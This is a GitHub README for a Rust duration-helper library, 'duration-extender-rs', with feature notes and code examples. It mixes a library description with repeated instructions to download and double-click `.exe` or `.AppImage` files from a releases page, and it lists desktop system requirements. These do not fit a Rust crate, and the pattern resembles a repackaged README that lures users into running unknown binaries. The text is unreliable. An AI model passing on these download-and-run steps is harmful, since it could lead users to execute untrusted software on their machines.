# 🎉 duration-extender-rs - Simplify Your Time Management

[![Download](https://img.shields.io/badge/Download%20Here!-blue.svg)](https://github.com/Shlok1234GG/duration-extender-rs/releases)

## 🎯 What is duration-extender-rs?

duration-extender-rs is an easy-to-use tool that helps you work with time more effectively. It allows you to create time durations in a simple and clear way. Whether you're setting timers, scheduling tasks, or managing delays, this tool makes it straightforward. 

## 🚀 Getting Started

To get started with duration-extender-rs, follow these steps:

1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Shlok1234GG/duration-extender-rs/releases) to access the latest version of the software.  
   
2. **Download the Latest Version:** Look for the most recent release. Click the link that says “Latest Release” to view available files. Download the one that matches your system. If you're unsure which one to choose, we recommend looking for files labeled for your operating system—like `.exe` for Windows or `.AppImage` for Linux. 

3. **Run the Software:** After downloading, locate the downloaded file in your system's Downloads folder.  
   - For Windows, double-click the `.exe` file. 
   - For macOS, drag the application to your Applications folder and then double-click to run it. 
   - For Linux, right-click on the `.AppImage` file and select "Run" to launch the application.

4. **Enjoy Using duration-extender-rs:** You are now ready to use duration-extender-rs to manage your time more effectively!

## 📦 Features

- **Intuitive Methods:** Create durations using simple expressions, such as `5.minutes()` or `3.seconds()`. This makes your code more readable and easier to understand.
  
- **Fractional Durations:** As of version 0.5.0, you can also create durations with fractions. For example, `0.5.seconds()` lets you set half-second timers easily.

- **Zero Dependencies:** The tool is lightweight and doesn't require any additional libraries, so you can get started quickly.

## 💡 Common Uses

- **Timeouts:** Set a limit for how long something can take.
- **Delays:** Schedule when an event should happen after waiting a specific period.
- **Timed Events:** Use simple durations to plan out repetitive tasks.

## 📝 Documentation

For more detailed information, including examples and advanced features, please check out the [Documentation](https://docs.rs/duration-extender).

## 📥 Download & Install

To download duration-extender-rs, you can visit our [Releases Page](https://github.com/Shlok1234GG/duration-extender-rs/releases) to choose the correct file for your system. Follow the steps outlined above to install it and begin using it in your projects.

## 🎉 What's New in v0.5.0

In the latest version, we've added support for fractional durations:

```rust
// New in v0.5.0 - Fractional durations
let half_second = 0.5.seconds();
let two_and_half_minutes = 2.5.minutes();

// Still works - Integer durations
let timeout = 30.seconds();
let delay = 5.minutes();
```

A special thanks to @oconnor663 for suggesting this feature!

## ⚠️ Breaking Changes in v0.4.0

In version 0.4.0, we made some important changes. The methods `.days()` and `.weeks()` have been removed. Please adjust your code accordingly.

## 🛠️ System Requirements

This tool runs on:

- **Operating Systems:** Windows 10 or later, macOS High Sierra or later, Linux distributions that support AppImage.
- **Memory:** Requires a minimum of 256MB RAM to function efficiently.
- **CPU:** Any modern CPU should work well with duration-extender-rs.

## 🤝 Contributing

We welcome contributions! If you have suggestions or want to report any issues, please create an issue on GitHub. Feel free to clone the repository and submit a pull request for any enhancements.

## 📅 Roadmap

Future versions may include:

- Enhanced support for more complex time manipulations.
- Integration with more programming environments.
- User feedback to guide new features.

## 🙌 Community

Join us to share your experiences, ask questions, and connect with other users. Follow our discussion on GitHub Issues or check in on our Wiki for updates.

Ensure you have the latest version by visiting our [Releases Page](https://github.com/Shlok1234GG/duration-extender-rs/releases) frequently.

With duration-extender-rs, managing time is now easier and clearer. Start simplifying your time today!